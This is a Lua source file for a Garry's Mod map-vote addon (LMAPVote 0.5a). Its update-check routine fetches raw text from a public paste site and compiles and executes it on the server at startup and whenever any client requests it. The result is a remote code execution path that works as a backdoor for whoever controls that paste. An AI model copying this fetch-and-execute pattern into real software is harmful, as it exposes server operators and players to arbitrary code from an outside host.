--[[
	LMAPVote - Development Version 0.5a
		Copyright ( C ) 2014 ~ L7D
--]]

LMapvote.update = LMapvote.update or { }

function LMapvote.update.Check( )
	local function func( )
		LMapvote.update.buffer = { }
			
		local function run( str )
			local compile = CompileString( str, "LMapvote.update.Check( ) function", false )
			local tab = compile( )
			LMapvote.update.buffer = tab
		end
			
		http.Fetch( "http://textuploader.com/k6d5/raw",
			function( value )
				run( value )
			end,
			function( err )
				LMapvote.kernel.Print( LMapvote.rgb.Red, "Update check failed, - " .. err )
			end
		)

		for _, ent in pairs( player.GetAll( ) ) do
			netstream.Start( ent, "LMapvote.update.Send", {
				Tab = LMapvote.update.buffer
			} )
		end
	end
		
	if ( SERVER ) then
		func( )
		netstream.Hook( "LMapvote.update.FunctionSend", function( data )
			func( )
		end )
	elseif ( CLIENT ) then
		netstream.Start( "LMapvote.update.FunctionSend", 1 )
	end
end
	
if ( SERVER ) then
	LMapvote.update.buffer = LMapvote.update.buffer or { }

	hook.Add( "Initialize", "LMapvote.update.Initialize", function( )
		LMapvote.update.Check( )
	end )

	hook.Add( "PlayerAuthed", "LMapvote.update.PlayerAuthed", function( pl )
		netstream.Start( pl, "LMapvote.update.Send", {
			Tab = LMapvote.update.buffer
		} )
	end )
	
elseif ( CLIENT ) then
	LMapvote.update.buffer = LMapvote.update.buffer or { }
	
	netstream.Hook( "LMapvote.update.Send", function( data )
		LMapvote.update.buffer = data.Tab
	end )
end